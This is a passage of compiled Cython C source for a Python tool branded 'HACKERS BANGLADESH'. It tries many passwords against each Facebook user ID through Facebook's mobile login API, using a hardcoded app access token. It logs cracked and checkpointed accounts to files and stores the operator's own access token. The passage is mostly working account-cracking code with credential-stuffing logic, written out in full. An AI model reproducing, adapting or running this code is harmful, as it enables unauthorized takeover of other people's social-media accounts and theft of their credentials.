 * 				self.ok.append("%s|%s"%(uid, pw))
 * 				open("OK/%s.txt"%(date),"a").write("  ~> %s|%s\n"%(uid, pw))
 * 				break             # <<<<<<<<<<<<<<
 * 			elif "www.facebook.com" in response.json()["error_msg"]:
 * 				print("\r  \033[0;97m ~> %s|%s\033[0;97m         "%(uid, pw))
 */
      goto __pyx_L4_break;

      /* "libme.pyx":314
 * 			}
 * 			response = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers)
 * 			if "session_key" in response.text and "EAAA" in response.text:             # <<<<<<<<<<<<<<
 * 				print("\r  \033[0;92m ~> %s|%s\033[0;97m         "%(uid, pw))
 * 				self.ok.append("%s|%s"%(uid, pw))
 */
    }

    /* "libme.pyx":319
 * 				open("OK/%s.txt"%(date),"a").write("  ~> %s|%s\n"%(uid, pw))
 * 				break
 * 			elif "www.facebook.com" in response.json()["error_msg"]:             # <<<<<<<<<<<<<<
 * 				print("\r  \033[0;97m ~> %s|%s\033[0;97m         "%(uid, pw))
 * 				self.cp.append("%s|%s"%(uid, pw))
 */
    __pyx_t_8 = __Pyx_PyObject_GetAttrStr(__pyx_v_response, __pyx_n_s_json); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 319, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_8);
    __pyx_t_3 = NULL;
    if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_8))) {
      __pyx_t_3 = PyMethod_GET_SELF(__pyx_t_8);
      if (likely(__pyx_t_3)) {
        PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_8);
        __Pyx_INCREF(__pyx_t_3);
        __Pyx_INCREF(function);
        __Pyx_DECREF_SET(__pyx_t_8, function);
      }
    }
    __pyx_t_6 = (__pyx_t_3) ? __Pyx_PyObject_CallOneArg(__pyx_t_8, __pyx_t_3) : __Pyx_PyObject_CallNoArg(__pyx_t_8);
    __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
    if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 319, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_6);
    __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
    __pyx_t_8 = __Pyx_PyObject_Dict_GetItem(__pyx_t_6, __pyx_n_s_error_msg); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 319, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_8);
    __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
    __pyx_t_10 = (__Pyx_PySequence_ContainsTF(__pyx_kp_s_www_facebook_com, __pyx_t_8, Py_EQ)); if (unlikely(__pyx_t_10 < 0)) __PYX_ERR(0, 319, __pyx_L1_error)
    __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
    __pyx_t_11 = (__pyx_t_10 != 0);
    if (__pyx_t_11) {

      /* "libme.pyx":320
 * 				break
 * 			elif "www.facebook.com" in response.json()["error_msg"]:
 * 				print("\r  \033[0;97m ~> %s|%s\033[0;97m         "%(uid, pw))             # <<<<<<<<<<<<<<
 * 				self.cp.append("%s|%s"%(uid, pw))
 * 				open("CP/%s.txt"%(date),"a").write("  ~> %s|%s\n"%(uid, pw))
 */
      __pyx_t_8 = PyTuple_New(2); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 320, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_8);
      __Pyx_INCREF(__pyx_v_uid);
      __Pyx_GIVEREF(__pyx_v_uid);
      PyTuple_SET_ITEM(__pyx_t_8, 0, __pyx_v_uid);
      __Pyx_INCREF(__pyx_v_pw);
      __Pyx_GIVEREF(__pyx_v_pw);
      PyTuple_SET_ITEM(__pyx_t_8, 1, __pyx_v_pw);
      __pyx_t_6 = __Pyx_PyString_Format(__pyx_kp_s_0_97m_s_s_0_97m, __pyx_t_8); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 320, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_6);
      __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
      if (__Pyx_PrintOne(0, __pyx_t_6) < 0) __PYX_ERR(0, 320, __pyx_L1_error)
      __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;

      /* "libme.pyx":321
 * 			elif "www.facebook.com" in response.json()["error_msg"]:
 * 				print("\r  \033[0;97m ~> %s|%s\033[0;97m         "%(uid, pw))
 * 				self.cp.append("%s|%s"%(uid, pw))             # <<<<<<<<<<<<<<
 * 				open("CP/%s.txt"%(date),"a").write("  ~> %s|%s\n"%(uid, pw))
 * 				break
 */
      __pyx_t_6 = __Pyx_PyObject_GetAttrStr(__pyx_v_self, __pyx_n_s_cp); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 321, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_6);
      __pyx_t_8 = PyTuple_New(2); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 321, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_8);
      __Pyx_INCREF(__pyx_v_uid);
      __Pyx_GIVEREF(__pyx_v_uid);
      PyTuple_SET_ITEM(__pyx_t_8, 0, __pyx_v_uid);
      __Pyx_INCREF(__pyx_v_pw);
      __Pyx_GIVEREF(__pyx_v_pw);
      PyTuple_SET_ITEM(__pyx_t_8, 1, __pyx_v_pw);
      __pyx_t_3 = __Pyx_PyString_Format(__pyx_kp_s_s_s, __pyx_t_8); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 321, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_3);
      __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
      __pyx_t_13 = __Pyx_PyObject_Append(__pyx_t_6, __pyx_t_3); if (unlikely(__pyx_t_13 == ((int)-1))) __PYX_ERR(0, 321, __pyx_L1_error)
      __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
      __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;

      /* "libme.pyx":322
 * 				print("\r  \033[0;97m ~> %s|%s\033[0;97m         "%(uid, pw))
 * 				self.cp.append("%s|%s"%(uid, pw))
 * 				open("CP/%s.txt"%(date),"a").write("  ~> %s|%s\n"%(uid, pw))             # <<<<<<<<<<<<<<
 * 				break
 * 			else:
 */
      __Pyx_GetModuleGlobalName(__pyx_t_6, __pyx_n_s_date); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 322, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_6);
      __pyx_t_8 = __Pyx_PyString_FormatSafe(__pyx_kp_s_CP_s_txt, __pyx_t_6); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 322, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_8);
      __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
      __pyx_t_6 = PyTuple_New(2); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 322, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_6);
      __Pyx_GIVEREF(__pyx_t_8);
      PyTuple_SET_ITEM(__pyx_t_6, 0, __pyx_t_8);
      __Pyx_INCREF(__pyx_n_s_a);
      __Pyx_GIVEREF(__pyx_n_s_a);
      PyTuple_SET_ITEM(__pyx_t_6, 1, __pyx_n_s_a);
      __pyx_t_8 = 0;
      __pyx_t_8 = __Pyx_PyObject_Call(__pyx_builtin_open, __pyx_t_6, NULL); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 322, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_8);
      __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
      __pyx_t_6 = __Pyx_PyObject_GetAttrStr(__pyx_t_8, __pyx_n_s_write); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 322, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_6);
      __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
      __pyx_t_8 = PyTuple_New(2); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 322, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_8);
      __Pyx_INCREF(__pyx_v_uid);
      __Pyx_GIVEREF(__pyx_v_uid);
      PyTuple_SET_ITEM(__pyx_t_8, 0, __pyx_v_uid);
      __Pyx_INCREF(__pyx_v_pw);
      __Pyx_GIVEREF(__pyx_v_pw);
      PyTuple_SET_ITEM(__pyx_t_8, 1, __pyx_v_pw);
      __pyx_t_7 = __Pyx_PyString_Format(__pyx_kp_s_s_s_2, __pyx_t_8); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 322, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_7);
      __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
      __pyx_t_8 = NULL;
      if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_6))) {
        __pyx_t_8 = PyMethod_GET_SELF(__pyx_t_6);
        if (likely(__pyx_t_8)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_6);
          __Pyx_INCREF(__pyx_t_8);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_6, function);
        }
      }
      __pyx_t_3 = (__pyx_t_8) ? __Pyx_PyObject_Call2Args(__pyx_t_6, __pyx_t_8, __pyx_t_7) : __Pyx_PyObject_CallOneArg(__pyx_t_6, __pyx_t_7);
      __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;
      __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
      if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 322, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_3);
      __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
      __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;

      /* "libme.pyx":323
 * 				self.cp.append("%s|%s"%(uid, pw))
 * 				open("CP/%s.txt"%(date),"a").write("  ~> %s|%s\n"%(uid, pw))
 * 				break             # <<<<<<<<<<<<<<
 * 			else:
 * 				continue
 */
      goto __pyx_L4_break;

      /* "libme.pyx":319
 * 				open("OK/%s.txt"%(date),"a").write("  ~> %s|%s\n"%(uid, pw))
 * 				break
 * 			elif "www.facebook.com" in response.json()["error_msg"]:             # <<<<<<<<<<<<<<
 * 				print("\r  \033[0;97m ~> %s|%s\033[0;97m         "%(uid, pw))
 * 				self.cp.append("%s|%s"%(uid, pw))
 */
    }

    /* "libme.pyx":325
 * 				break
 * 			else:
 * 				continue             # <<<<<<<<<<<<<<
 * 		self.loop +=1
 * 	def __login__(self):
 */
    /*else*/ {
      goto __pyx_L3_continue;
    }

    /* "libme.pyx":300
 * 			"\r  [] %s/%s ~> ok~> %s - cp~> %s "%(self.loop, len(self.id), len(self.ok), len(self.cp))
 * 		); sys.stdout.flush()
 * 		for pw in pwx:             # <<<<<<<<<<<<<<
 * 			pw = pw.lower()
 * 			ses = requests.Session()
 */
    __pyx_L3_continue:;
  }
  __pyx_L4_break:;
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  /* "libme.pyx":326
 * 			else:
 * 				continue
 * 		self.loop +=1             # <<<<<<<<<<<<<<
 * 	def __login__(self):
 * 		os.system('clear')
 */
  __pyx_t_1 = __Pyx_PyObject_GetAttrStr(__pyx_v_self, __pyx_n_s_loop); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 326, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __pyx_t_3 = __Pyx_PyInt_AddObjC(__pyx_t_1, __pyx_int_1, 1, 1, 0); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 326, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  if (__Pyx_PyObject_SetAttrStr(__pyx_v_self, __pyx_n_s_loop, __pyx_t_3) < 0) __PYX_ERR(0, 326, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;

  /* "libme.pyx":284
 * 		except Exception as e:
 * 			exit(str(e))
 * 	def __apii__(self, uid, pwx):             # <<<<<<<<<<<<<<
 * 		ua = random.choice([
 * 			"Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z007;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]",
 */

  /* function exit code */
  __pyx_r = Py_None; __Pyx_INCREF(Py_None);
  goto __pyx_L0;
  __pyx_L1_error:;
  __Pyx_XDECREF(__pyx_t_1);
  __Pyx_XDECREF(__pyx_t_2);
  __Pyx_XDECREF(__pyx_t_3);
  __Pyx_XDECREF(__pyx_t_4);
  __Pyx_XDECREF(__pyx_t_6);
  __Pyx_XDECREF(__pyx_t_7);
  __Pyx_XDECREF(__pyx_t_8);
  __Pyx_AddTraceback("libme.James.__apii__", __pyx_clineno, __pyx_lineno, __pyx_filename);
  __pyx_r = NULL;
  __pyx_L0:;
  __Pyx_XDECREF(__pyx_v_ua);
  __Pyx_XDECREF(__pyx_v_pw);
  __Pyx_XDECREF(__pyx_v_ses);
  __Pyx_XDECREF(__pyx_v_headers);
  __Pyx_XDECREF(__pyx_v_response);
  __Pyx_XGIVEREF(__pyx_r);
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

/* "libme.pyx":327
 * 				continue
 * 		self.loop +=1
 * 	def __login__(self):             # <<<<<<<<<<<<<<
 * 		os.system('clear')
 * 		print("\n\033[1;92m    _          _          \n\033[1;92m     \        /          \n\033[1;92m    __\______/__ \n\033[1;92m    | [\033[1;31;1m\033[1;92m]  [\033[1;31;1m\033[1;92m] | \n\033[1;92m    |  [\33[1;33m====\033[1;92m]  | [+] HACKERS BANGLADESH [+] \n\033[1;92mo0000o \n\033[1;31;1m \033[1;92m [] \033[1;31;1mAuthor    :  \033[1;92m James404_           \033[1;31;1m  \n\x1b[0;97m\033[1;31;1m \033[1;92m [] \033[1;31;1mWhatsapp  :  \033[1;92m +96598064347        \033[1;31;1m   \n\x1b[0;97m\033[1;31;1m \033[1;92m [] \033[1;31;1mWhatsapp  : \033[1;92m  Black404_           \033[1;31;1m \n\033[1;31;1m \033[1;92m [] \033[1;31;1mGrup Fb   :  \033[1;92m Termux Command World\033[1;31;1m  \n\033[1;31;1m \033[1;92m [] \033[1;31;1mVersion   :  \033[1;92m 0.3                  \033[1;31;1m \n\033[1;92m")
 */

/* Python wrapper */
static PyObject *__pyx_pw_5libme_5James_19__login__(PyObject *__pyx_self, PyObject *__pyx_v_self); /*proto*/
static PyMethodDef __pyx_mdef_5libme_5James_19__login__ = {"__login__", (PyCFunction)__pyx_pw_5libme_5James_19__login__, METH_O, 0};
static PyObject *__pyx_pw_5libme_5James_19__login__(PyObject *__pyx_self, PyObject *__pyx_v_self) {
  PyObject *__pyx_r = 0;
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("__login__ (wrapper)", 0);
  __pyx_r = __pyx_pf_5libme_5James_18__login__(__pyx_self, ((PyObject *)__pyx_v_self));

  /* function exit code */
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

static PyObject *__pyx_pf_5libme_5James_18__login__(CYTHON_UNUSED PyObject *__pyx_self, PyObject *__pyx_v_self) {
  PyObject *__pyx_v_token = NULL;
  CYTHON_UNUSED PyObject *__pyx_v_nama = NULL;
  PyObject *__pyx_r = NULL;
  __Pyx_RefNannyDeclarations
  PyObject *__pyx_t_1 = NULL;
  PyObject *__pyx_t_2 = NULL;
  PyObject *__pyx_t_3 = NULL;
  PyObject *__pyx_t_4 = NULL;
  PyObject *__pyx_t_5 = NULL;
  PyObject *__pyx_t_6 = NULL;
  PyObject *__pyx_t_7 = NULL;
  PyObject *__pyx_t_8 = NULL;
  PyObject *__pyx_t_9 = NULL;
  int __pyx_t_10;
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  __Pyx_RefNannySetupContext("__login__", 0);

  /* "libme.pyx":328
 * 		self.loop +=1
 * 	def __login__(self):
 * 		os.system('clear')             # <<<<<<<<<<<<<<
 * 		print("\n\033[1;92m    _          _          \n\033[1;92m     \        /          \n\033[1;92m    __\______/__ \n\033[1;92m    | [\033[1;31;1m\033[1;92m]  [\033[1;31;1m\033[1;92m] | \n\033[1;92m    |  [\33[1;33m====\033[1;92m]  | [+] HACKERS BANGLADESH [+] \n\033[1;92mo0000o \n\033[1;31;1m \033[1;92m [] \033[1;31;1mAuthor    :  \033[1;92m James404_           \033[1;31;1m  \n\x1b[0;97m\033[1;31;1m \033[1;92m [] \033[1;31;1mWhatsapp  :  \033[1;92m +96598064347        \033[1;31;1m   \n\x1b[0;97m\033[1;31;1m \033[1;92m [] \033[1;31;1mWhatsapp  : \033[1;92m  Black404_           \033[1;31;1m \n\033[1;31;1m \033[1;92m [] \033[1;31;1mGrup Fb   :  \033[1;92m Termux Command World\033[1;31;1m  \n\033[1;31;1m \033[1;92m [] \033[1;31;1mVersion   :  \033[1;92m 0.3                  \033[1;31;1m \n\033[1;92m")
 * 		print
 */
  __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_os); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 328, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_t_2, __pyx_n_s_system); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 328, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = NULL;
  if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_3))) {
    __pyx_t_2 = PyMethod_GET_SELF(__pyx_t_3);
    if (likely(__pyx_t_2)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_3);
      __Pyx_INCREF(__pyx_t_2);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_3, function);
    }
  }
  __pyx_t_1 = (__pyx_t_2) ? __Pyx_PyObject_Call2Args(__pyx_t_3, __pyx_t_2, __pyx_n_s_clear) : __Pyx_PyObject_CallOneArg(__pyx_t_3, __pyx_n_s_clear);
  __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
  if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 328, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  /* "libme.pyx":329
 * 	def __login__(self):
 * 		os.system('clear')
 * 		print("\n\033[1;92m    _          _          \n\033[1;92m     \        /          \n\033[1;92m    __\______/__ \n\033[1;92m    | [\033[1;31;1m\033[1;92m]  [\033[1;31;1m\033[1;92m] | \n\033[1;92m    |  [\33[1;33m====\033[1;92m]  | [+] HACKERS BANGLADESH [+] \n\033[1;92mo0000o \n\033[1;31;1m \033[1;92m [] \033[1;31;1mAuthor    :  \033[1;92m James404_           \033[1;31;1m  \n\x1b[0;97m\033[1;31;1m \033[1;92m [] \033[1;31;1mWhatsapp  :  \033[1;92m +96598064347        \033[1;31;1m   \n\x1b[0;97m\033[1;31;1m \033[1;92m [] \033[1;31;1mWhatsapp  : \033[1;92m  Black404_           \033[1;31;1m \n\033[1;31;1m \033[1;92m [] \033[1;31;1mGrup Fb   :  \033[1;92m Termux Command World\033[1;31;1m  \n\033[1;31;1m \033[1;92m [] \033[1;31;1mVersion   :  \033[1;92m 0.3                  \033[1;31;1m \n\033[1;92m")             # <<<<<<<<<<<<<<
 * 		print
 * 		token = input('\n   \033[0;97m[+] Your Token : ')
 */
  if (__Pyx_PrintOne(0, __pyx_kp_s_1_92m_____1_92m_1_92m) < 0) __PYX_ERR(0, 329, __pyx_L1_error)

  /* "libme.pyx":330
 * 		os.system('clear')
 * 		print("\n\033[1;92m    _          _          \n\033[1;92m     \        /          \n\033[1;92m    __\______/__ \n\033[1;92m    | [\033[1;31;1m\033[1;92m]  [\033[1;31;1m\033[1;92m] | \n\033[1;92m    |  [\33[1;33m====\033[1;92m]  | [+] HACKERS BANGLADESH [+] \n\033[1;92mo0000o \n\033[1;31;1m \033[1;92m [] \033[1;31;1mAuthor    :  \033[1;92m James404_           \033[1;31;1m  \n\x1b[0;97m\033[1;31;1m \033[1;92m [] \033[1;31;1mWhatsapp  :  \033[1;92m +96598064347        \033[1;31;1m   \n\x1b[0;97m\033[1;31;1m \033[1;92m [] \033[1;31;1mWhatsapp  : \033[1;92m  Black404_           \033[1;31;1m \n\033[1;31;1m \033[1;92m [] \033[1;31;1mGrup Fb   :  \033[1;92m Termux Command World\033[1;31;1m  \n\033[1;31;1m \033[1;92m [] \033[1;31;1mVersion   :  \033[1;92m 0.3                  \033[1;31;1m \n\033[1;92m")
 * 		print             # <<<<<<<<<<<<<<
 * 		token = input('\n   \033[0;97m[+] Your Token : ')
 * 		try:
 */
  if (__Pyx_Print(0, __pyx_empty_tuple, 1) < 0) __PYX_ERR(0, 330, __pyx_L1_error)

  /* "libme.pyx":331
 * 		print("\n\033[1;92m    _          _          \n\033[1;92m     \        /          \n\033[1;92m    __\______/__ \n\033[1;92m    | [\033[1;31;1m\033[1;92m]  [\033[1;31;1m\033[1;92m] | \n\033[1;92m    |  [\33[1;33m====\033[1;92m]  | [+] HACKERS BANGLADESH [+] \n\033[1;92mo0000o \n\033[1;31;1m \033[1;92m [] \033[1;31;1mAuthor    :  \033[1;92m James404_           \033[1;31;1m  \n\x1b[0;97m\033[1;31;1m \033[1;92m [] \033[1;31;1mWhatsapp  :  \033[1;92m +96598064347        \033[1;31;1m   \n\x1b[0;97m\033[1;31;1m \033[1;92m [] \033[1;31;1mWhatsapp  : \033[1;92m  Black404_           \033[1;31;1m \n\033[1;31;1m \033[1;92m [] \033[1;31;1mGrup Fb   :  \033[1;92m Termux Command World\033[1;31;1m  \n\033[1;31;1m \033[1;92m [] \033[1;31;1mVersion   :  \033[1;92m 0.3                  \033[1;31;1m \n\033[1;92m")
 * 		print
 * 		token = input('\n   \033[0;97m[+] Your Token : ')             # <<<<<<<<<<<<<<
 * 		try:
 * 			nama = requests.get("https://graph.facebook.com/me?access_token="+token).json()["name"].lower()
 */
  __pyx_t_1 = __Pyx_PyObject_Call(__pyx_builtin_input, __pyx_tuple__25, NULL); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 331, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __pyx_v_token = __pyx_t_1;
  __pyx_t_1 = 0;

  /* "libme.pyx":332
 * 		print
 * 		token = input('\n   \033[0;97m[+] Your Token : ')
 * 		try:             # <<<<<<<<<<<<<<
 * 			nama = requests.get("https://graph.facebook.com/me?access_token="+token).json()["name"].lower()
 * 			open("login.txt", "w").write(token)
 */
  {
    __Pyx_PyThreadState_declare
    __Pyx_PyThreadState_assign
    __Pyx_ExceptionSave(&__pyx_t_4, &__pyx_t_5, &__pyx_t_6);
    __Pyx_XGOTREF(__pyx_t_4);
    __Pyx_XGOTREF(__pyx_t_5);
    __Pyx_XGOTREF(__pyx_t_6);
    /*try:*/ {

      /* "libme.pyx":333
 * 		token = input('\n   \033[0;97m[+] Your Token : ')
 * 		try:
 * 			nama = requests.get("https://graph.facebook.com/me?access_token="+token).json()["name"].lower()             # <<<<<<<<<<<<<<
 * 			open("login.txt", "w").write(token)
 * 			print (" \n  [] successful login token")
 */
      __Pyx_GetModuleGlobalName(__pyx_t_7, __pyx_n_s_requests); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 333, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_7);
      __pyx_t_8 = __Pyx_PyObject_GetAttrStr(__pyx_t_7, __pyx_n_s_get); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 333, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_8);
      __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
      __pyx_t_7 = PyNumber_Add(__pyx_kp_s_https_graph_facebook_com_me_acce, __pyx_v_token); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 333, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_7);
      __pyx_t_9 = NULL;
      if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_8))) {
        __pyx_t_9 = PyMethod_GET_SELF(__pyx_t_8);
        if (likely(__pyx_t_9)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_8);
          __Pyx_INCREF(__pyx_t_9);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_8, function);
        }
      }
      __pyx_t_2 = (__pyx_t_9) ? __Pyx_PyObject_Call2Args(__pyx_t_8, __pyx_t_9, __pyx_t_7) : __Pyx_PyObject_CallOneArg(__pyx_t_8, __pyx_t_7);
      __Pyx_XDECREF(__pyx_t_9); __pyx_t_9 = 0;
      __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
      if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 333, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_2);
      __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
      __pyx_t_8 = __Pyx_PyObject_GetAttrStr(__pyx_t_2, __pyx_n_s_json); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 333, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_8);
      __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
      __pyx_t_2 = NULL;
      if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_8))) {
        __pyx_t_2 = PyMethod_GET_SELF(__pyx_t_8);
        if (likely(__pyx_t_2)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_8);
          __Pyx_INCREF(__pyx_t_2);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_8, function);
        }
      }
      __pyx_t_3 = (__pyx_t_2) ? __Pyx_PyObject_CallOneArg(__pyx_t_8, __pyx_t_2) : __Pyx_PyObject_CallNoArg(__pyx_t_8);
      __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
      if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 333, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_3);
      __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
      __pyx_t_8 = __Pyx_PyObject_Dict_GetItem(__pyx_t_3, __pyx_n_s_name); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 333, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_8);
      __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
      __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_t_8, __pyx_n_s_lower); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 333, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_3);
      __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
      __pyx_t_8 = NULL;
      if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_3))) {
        __pyx_t_8 = PyMethod_GET_SELF(__pyx_t_3);
        if (likely(__pyx_t_8)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_3);
          __Pyx_INCREF(__pyx_t_8);
          __Pyx_INCREF(function);
          __Pyx_DECREF_SET(__pyx_t_3, function);
        }
      }
      __pyx_t_1 = (__pyx_t_8) ? __Pyx_PyObject_CallOneArg(__pyx_t_3, __pyx_t_8) : __Pyx_PyObject_CallNoArg(__pyx_t_3);
      __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;
      if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 333, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_1);
      __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
      __pyx_v_nama = __pyx_t_1;
      __pyx_t_1 = 0;

      /* "libme.pyx":334
 * 		try:
 * 			nama = requests.get("https://graph.facebook.com/me?access_token="+token).json()["name"].lower()
 * 			open("login.txt", "w").write(token)             # <<<<<<<<<<<<<<
 * 			print (" \n  [] successful login token")
 * 			self.__bot__follow__()
 */
      __pyx_t_3 = __Pyx_PyObject_Call(__pyx_builtin_open, __pyx_tuple__26, NULL); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 334, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_3);
      __pyx_t_8 = __Pyx_PyObject_GetAttrStr(__pyx_t_3, __pyx_n_s_write); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 334, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_8);
      __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
      __pyx_t_3 = NULL;
      if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_8))) {
        __pyx_t_3 = PyMethod_GET_SELF(__pyx_t_8);
        if (likely(__pyx_t_3)) {
          PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_8);
          __Pyx_INCREF(__pyx_t_3);
          __Pyx_INCREF(function);
